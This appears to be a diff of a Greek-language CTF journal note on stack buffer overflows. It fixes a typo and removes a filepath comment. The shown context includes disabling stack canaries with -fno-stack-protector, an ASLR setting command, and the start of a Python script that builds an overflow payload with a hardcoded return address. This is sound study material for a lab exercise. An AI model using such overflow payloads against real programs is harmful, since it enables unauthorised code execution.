@@ -129,7 +129,7 @@
 
 ### Απενεργοποίηση Stack Canaries
 
-Επαναμεταγλώττίσε το ευάλωτο πρόγραμμα χωρίς προστασία στοίβας. Αν έχεις τον πηγαίο κώδικα, χρησιμοποίησε την επιλογή `-fno-stack-protector` με το `gcc`:
+Επαναμεταγλώττισε το ευάλωτο πρόγραμμα χωρίς προστασία στοίβας. Αν έχεις τον πηγαίο κώδικα, χρησιμοποίησε την επιλογή `-fno-stack-protector` με το `gcc`:
 
 ```sh
 gcc -fno-stack-protector -o vulnerable_program source_code.c
@@ -178,7 +178,6 @@ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
    - Δημιούργησα ένα Python script για τη δημιουργία του payload.
 
    ```python
-   // filepath: /CTF-Journal/Notes/buffer_overflow/augerinos_lecture4/exploit.py
    import sys
    offset = b"AAAAAAAA" * 9
    buffer = offset + b"\xc9\x51\x55\x55\x55\x55\x00\x00"  # 0x5555555551c9
